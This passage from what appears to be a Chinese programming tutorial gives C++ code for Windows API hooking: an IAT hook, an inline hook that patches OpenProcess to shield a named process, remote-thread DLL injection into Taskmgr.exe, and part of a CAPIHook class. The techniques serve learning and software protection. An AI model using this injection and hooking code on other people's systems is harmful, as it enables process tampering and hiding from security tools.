class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;IATHookMessageBoxW.h&quot;</span></span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">&#123;</span><br><span class="line">LPVOID ExeBase = GetModuleHandle(<span class="number">0</span>);</span><br><span class="line">IatHook((<span class="keyword">char</span>*)ExeBase,(DWORD)MyMessageBoxW,<span class="string">&quot;MessageBoxW&quot;</span>,<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Process-Hook"><a href="#Process-Hook" class="headerlink" title="Process_Hook"></a>Process_Hook</h3><h4 id="DLL文件"><a href="#DLL文件" class="headerlink" title="DLL文件"></a>DLL文件</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过进程名获取进程id</span></span><br><span class="line"><span class="function">DWORD <span class="title">GetPid</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span>* filePath)</span></span>;</span><br><span class="line"><span class="comment">// 获取helloworld程序pid</span></span><br><span class="line">DWORD g_dwPid = GetPid(<span class="string">L&quot;FileCleaner2.0.exe&quot;</span>);</span><br><span class="line"><span class="comment">// 旧的函数地址</span></span><br><span class="line">DWORD* g_pOldAddr = (DWORD*)OpenProcess;</span><br><span class="line"><span class="comment">// 旧的函数数据</span></span><br><span class="line"><span class="keyword">char</span> g_oldCode[<span class="number">5</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OnHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UnHook</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写自己的OpenProcess函数</span></span><br><span class="line"><span class="function">HANDLE WINAPI <span class="title">MyOpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">_In_ DWORD dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">_In_ BOOL bInheritHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">_In_ DWORD dwProcessId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 比对pid是否与helloworld程序相等</span></span><br><span class="line"><span class="keyword">if</span> (dwProcessId == g_dwPid)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="number">0</span>,<span class="string">L&quot;进程被保护&quot;</span>,<span class="string">L&quot;提示&quot;</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 如果不相等，重新调用原来的OpenProcess函数</span></span><br><span class="line"><span class="comment">// 先恢复原来函数数据</span></span><br><span class="line">UnHook();</span><br><span class="line">HANDLE hProcess = OpenProcess(</span><br><span class="line">dwDesiredAccess, bInheritHandle, dwProcessId);</span><br><span class="line"><span class="comment">// 调用完之后重新hook</span></span><br><span class="line">OnHook();</span><br><span class="line"><span class="keyword">return</span> hProcess;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">&#123;</span><br><span class="line">OnHook();</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;注入成功&quot;</span>, <span class="string">L&quot;提示&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1.先保存OpenProcess原来的数据</span></span><br><span class="line"><span class="built_in">memcpy</span>(g_oldCode, g_pOldAddr, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.设置新的指令,jmp</span></span><br><span class="line"><span class="keyword">char</span> opcode[<span class="number">5</span>] = &#123; <span class="number">0xE9</span> &#125;;</span><br><span class="line"><span class="comment">// 2.1 计算偏移并赋值</span></span><br><span class="line">*(DWORD*)(opcode + <span class="number">1</span>) = (DWORD)MyOpenProcess - (DWORD)OpenProcess - <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.修改保护属性</span></span><br><span class="line">DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line">VirtualProtect(g_pOldAddr, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.写入跳转指令</span></span><br><span class="line"><span class="built_in">memcpy</span>(g_pOldAddr, opcode, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.还原保护属性</span></span><br><span class="line">VirtualProtect(g_pOldAddr, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1.修改保护属性</span></span><br><span class="line">DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line">VirtualProtect(g_pOldAddr, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"><span class="comment">// 2.还原旧的指令数据</span></span><br><span class="line"><span class="built_in">memcpy</span>(g_pOldAddr, g_oldCode, <span class="number">5</span>);</span><br><span class="line"><span class="comment">// 3.还原保护属性</span></span><br><span class="line">VirtualProtect(g_pOldAddr, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">GetPid</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span>* szExeName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 创建进程快照</span></span><br><span class="line">HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 判断快照句柄是否有效</span></span><br><span class="line"><span class="keyword">if</span> (hSnapshot != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//定义进程结构体，第一个元素必须赋值为结构体大小</span></span><br><span class="line">PROCESSENTRY32 stcPe32 = &#123; <span class="keyword">sizeof</span>(PROCESSENTRY32) &#125;;</span><br><span class="line"><span class="comment">//查找第一个进程</span></span><br><span class="line">Process32First(hSnapshot, &amp;stcPe32);</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;<span class="comment">// 如果进程名一致，返回进程id</span></span><br><span class="line"><span class="keyword">if</span> (!wcscmp(stcPe32.szExeFile, szExeName))</span><br><span class="line"><span class="keyword">return</span> stcPe32.th32ProcessID;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查找下一个进程</span></span><br><span class="line">&#125; <span class="keyword">while</span> (Process32Next(hSnapshot, &amp;stcPe32));</span><br><span class="line"><span class="comment">//关闭快照句柄</span></span><br><span class="line">CloseHandle(hSnapshot);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="测试文件"><a href="#测试文件" class="headerlink" title="测试文件"></a>测试文件</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注入.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLLPATH <span class="meta-string">&quot;C:\\Users\\hugan\\Documents\\15PB\\代码注入与拦截\\OD注入\\x64\\Debug\\InlineHook.dll&quot;</span></span></span><br><span class="line"><span class="comment">//#define DLLPATH &quot;D:\\041\\test\\Debug\\IatHook.dll&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过进程名获取进程id</span></span><br><span class="line"><span class="function">DWORD <span class="title">GetPid</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span>* szExeName)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1.获取目标进程句柄</span></span><br><span class="line"><span class="comment">// 1.1 获取指定进程id</span></span><br><span class="line">DWORD dwPid = GetPid(<span class="string">L&quot;Taskmgr.exe&quot;</span>);</span><br><span class="line"><span class="comment">// 1.2 打开进程（注入OD需要以管理员身份运行vs，否则无法打开进程)</span></span><br><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line"><span class="comment">// 1.3 检测进程句柄</span></span><br><span class="line"><span class="keyword">if</span> (hProcess == INVALID_HANDLE_VALUE)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.1 计算dll路径长度</span></span><br><span class="line">DWORD dwSize = <span class="built_in">strlen</span>(DLLPATH) + <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 2.在目标进程申请一段空间</span></span><br><span class="line">LPVOID lpAddr = VirtualAllocEx(</span><br><span class="line">hProcess, <span class="number">0</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.1 写入之前可以先测试加载一下看能否成功</span></span><br><span class="line"><span class="comment">/*HMODULE hMod = LoadLibraryA(DLLPATH);</span></span><br><span class="line"><span class="comment">MessageBoxW(0, 0, 0, 0);*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.将dll名字写入到目标进程空间中</span></span><br><span class="line"><span class="comment">// 注意：路径与函数必须匹配，A版函数配A版字符串。如果用W版，写入的时候，长度要乘以2，</span></span><br><span class="line"><span class="comment">//因为wcslen求出的是字符串长度而不是字节数</span></span><br><span class="line"><span class="keyword">if</span> (!WriteProcessMemory(hProcess, lpAddr, DLLPATH, dwSize, <span class="literal">NULL</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.创建远程线程</span></span><br><span class="line">HANDLE hRtThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">(LPTHREAD_START_ROUTINE)LoadLibraryA,lpAddr, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.等待执行结果</span></span><br><span class="line">WaitForSingleObject(hRtThread, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6.获取线程退出码</span></span><br><span class="line">DWORD dwExitCode = <span class="number">0</span>;</span><br><span class="line">GetExitCodeThread(hRtThread, &amp;dwExitCode);</span><br><span class="line"><span class="comment">// 6.1 退出码也就是LoadLibrary的返回值（如果执行成功，就是dll的模块句柄）</span></span><br><span class="line">HMODULE hModule = (HMODULE)dwExitCode;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7.释放空间</span></span><br><span class="line"><span class="keyword">if</span> (!VirtualFreeEx(hProcess, lpAddr, dwSize, MEM_DECOMMIT))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">GetPid</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span>* szExeName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 创建进程快照</span></span><br><span class="line">HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 判断快照句柄是否有效</span></span><br><span class="line"><span class="keyword">if</span> (hSnapshot != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//定义进程结构体，第一个元素必须赋值为结构体大小</span></span><br><span class="line">PROCESSENTRY32 stcPe32 = &#123; <span class="keyword">sizeof</span>(PROCESSENTRY32) &#125;;</span><br><span class="line"><span class="comment">//查找第一个进程</span></span><br><span class="line">Process32First(hSnapshot, &amp;stcPe32);</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;<span class="comment">// 如果进程名一致，返回进程id</span></span><br><span class="line"><span class="keyword">if</span> (!wcscmp(stcPe32.szExeFile, szExeName))</span><br><span class="line"><span class="keyword">return</span> stcPe32.th32ProcessID;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查找下一个进程</span></span><br><span class="line">&#125; <span class="keyword">while</span> (Process32Next(hSnapshot, &amp;stcPe32));</span><br><span class="line"><span class="comment">//关闭快照句柄</span></span><br><span class="line">CloseHandle(hSnapshot);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="CAPIHook函数封装"><a href="#CAPIHook函数封装" class="headerlink" title="CAPIHook函数封装"></a>CAPIHook函数封装</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __APIHOOK_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __APIHOOK_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CAPIHook</span> </span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">       CAPIHook(LPSTR  pszModName, LPSTR pszFuncName,</span><br><span class="line">        PROC pfnHook, BOOL bExcludeAPIHookMod=TRUE);</span><br><span class="line">       <span class="keyword">virtual</span> ~CAPIHook();</span><br><span class="line">       <span class="function"><span class="keyword">operator</span> <span class="title">PROC</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> m_pfnOrig;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"></span><br><span class="line">       LPSTR m_pszModName;        <span class="comment">//导出要HOOK函数的模块的名字</span></span><br><span class="line">       LPSTR m_pszFuncName;  <span class="comment">//要HOOK的函数的名字</span></span><br><span class="line">       PROC m_pfnOrig;                  <span class="comment">//原API函数地址</span></span><br><span class="line">       PROC m_pfnHook;                <span class="comment">//HOOK后函数的地址</span></span><br><span class="line">       BOOL m_bExcludeAPIHookMod; <span class="comment">//是否将HOOK API的模块本身排除在外</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">       <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ReplaceIATEntryInAllMods</span><span class="params">(LPSTR pszExportMod, PROC pfnCurrent,PROC pfnNew, BOOL bExcludeAPIHookMod)</span></span>;</span><br><span class="line">       <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ReplaceIATEntryInOneMod</span><span class="params">(LPSTR pszExportMod, PROC pfnCurrent,PROC pfnNew, HMODULE hModCaller)</span></span>;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//下面的代码用来解决其他模块动态加载DLL的问题</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"></span><br><span class="line">       <span class="comment">//这两个指针用来将所有的CAPIHook对象连在一起</span></span><br><span class="line">       <span class="keyword">static</span> CAPIHook *sm_pHeader;</span><br><span class="line">       CAPIHook *m_pNext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"></span><br><span class="line">       <span class="comment">//当一个新的DLL被加载时，调用此函数</span></span><br><span class="line">       <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> WINAPI <span class="title">HookNewlyLoadedModule</span><span 